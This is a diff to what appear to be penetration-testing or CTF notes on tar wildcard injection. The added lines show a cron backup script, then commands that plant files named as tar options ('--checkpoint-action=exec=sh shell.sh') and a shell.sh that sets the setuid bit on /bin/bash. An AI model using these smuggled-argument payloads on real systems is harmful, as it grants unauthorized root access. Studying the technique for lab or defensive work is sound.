@@ -23,10 +23,30 @@ tar czf /tmp/backup.tar.gz *
 
 So, create checkpoint first
 #touch /home/user/--checkpoint=1
-#touch /home/user/--checkpoint-action=exec=shell.elf 
+#touch /home/user/--checkpoint-action=exec=shell.sh
 
 So,final command is like. ( we just inject the payload in the place of *(wild-card))
-tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint=action=shell.elf
+tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint=action=shell.sh
+
+
+4.Wildcard injection (backup.sh , that is running in cronjob)
+--------------------------------------------------------------
+#!/bin/bash
+
+# Where to backup to.
+dest="/var/backups"
+
+# What to backup. 
+cd /home/server-management/Documents
+backup_files="*"
+
+The script used "wildcard" to backup files in document folder.
+
+In /home/server-management/Documents
+
+#echo "chmod +s /bin/bash" > shell.sh
+#echo "" > "--checkpoint-action=exec=sh shell.sh"
+#echo "" > --checkpoint=1
 ____________________________________________________________________________________________________________________________
 #!/bin/bash
 cd /var/www/html
